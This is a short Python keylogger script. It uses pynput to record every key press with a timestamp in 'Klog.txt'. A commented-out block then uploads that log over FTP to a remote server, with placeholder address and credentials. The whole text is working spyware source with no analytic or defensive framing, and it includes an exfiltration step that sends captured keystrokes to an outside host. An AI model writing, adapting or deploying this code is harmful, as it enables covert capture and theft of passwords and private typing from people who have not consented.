from pynput.keyboard import Key, Listener
# import ftplib
import logging

logdir = ""

logging.basicConfig(filename=(logdir+"Klog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("a special key {0} has been pressed".format(Key))

def releasing_key(key):
    if key == Key.esc:
        return False

print("\nListening.....\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()

# print("\nconnecting to ftp and sending data.....\n")

# sess = ftplib.FTP("ip-address", "username", "password")
# file = open("Klog.txt", "rb")
# sess.storebinary("STOR Klog.txt", file)
# file.close()
# sess.quit()
